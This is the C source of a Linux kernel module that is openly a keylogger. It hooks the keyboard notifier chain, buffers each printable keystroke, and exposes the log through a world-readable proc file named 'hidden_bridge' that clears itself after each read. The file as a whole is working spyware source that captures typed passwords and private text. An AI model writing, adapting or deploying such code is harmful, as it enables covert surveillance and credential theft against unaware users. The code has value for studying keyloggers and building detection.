#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/keyboard.h>

#define PROC_NAME "hidden_bridge"
#define STATUS_BUF_SIZE 128
#define LOG_BUF_SIZE 1024

static struct proc_dir_entry *proc_file;
static char key_buffer[LOG_BUF_SIZE]; // Buffer to store a sequence of keys
static int key_index = 0; // Tracks how many keys were stored so far

static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) // callback function
{
    int len = key_index; // Only the bytes that were filled

    if (*ppos > 0)
    {
        return 0;
    }

    if (len == 0)
    {
        return 0;
    }

    if (copy_to_user(buf, key_buffer, len)) // Move the raw keylogs to user space
    {
        return -EFAULT;
    }

    // After a read - clean buffer so we only send new keys next time
    memset(key_buffer, 0, sizeof(key_buffer));
    key_index = 0;

    *ppos = len;
    return len;
}

static const struct proc_ops keylogger_proc_ops =
{
    .proc_read = keylogger_read, // Tell the proc filesystem to use my read function when someone cat's the file (callback)
};

static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param; // Cast the generic void pointer to the keyboard parameter struct

    // Filter for actual symbols and key presses (down)
    if (code == KBD_KEYSYM && param->down) // Only process events after the kernel translates the hardware code (KBD_KEYSYM)
    {
        char key = (char)param->value; 

        // Only log if its printable ASCII (Space to '~') or newline
        if ((key >= 0x20 && key <= 0x7E) || key == '\n') 
        {
            if (key_index < LOG_BUF_SIZE - 1) 
            {
                key_buffer[key_index] = key; 
                key_index++;
            }
        }
    }

    return NOTIFY_OK; 
}

static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_cb // Tell the keyboard subsystem to call my callback function when a key is pressed
};

static int __init keylogger_init(void)
{
    memset(key_buffer, 0, sizeof(key_buffer)); // Start with an empty log buffer

    register_keyboard_notifier(&keylogger_nb); // Tell Linux to start sending keyboard events to my callback
    proc_file = proc_create(PROC_NAME, 0444, NULL, &keylogger_proc_ops); // 0444 - read only permissions

    printk(KERN_INFO "keylogger: loaded\n"); 
    return 0;
}

static void __exit keylogger_exit(void)
{
    if (proc_file)
    {
        proc_remove(proc_file);
    }

    unregister_keyboard_notifier(&keylogger_nb); // Tell Linux to stop sending me keyboard events

    printk(KERN_INFO "keylogger: unloaded\n");
}

module_init(keylogger_init); // Tell the compiler which function is the startup hook
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");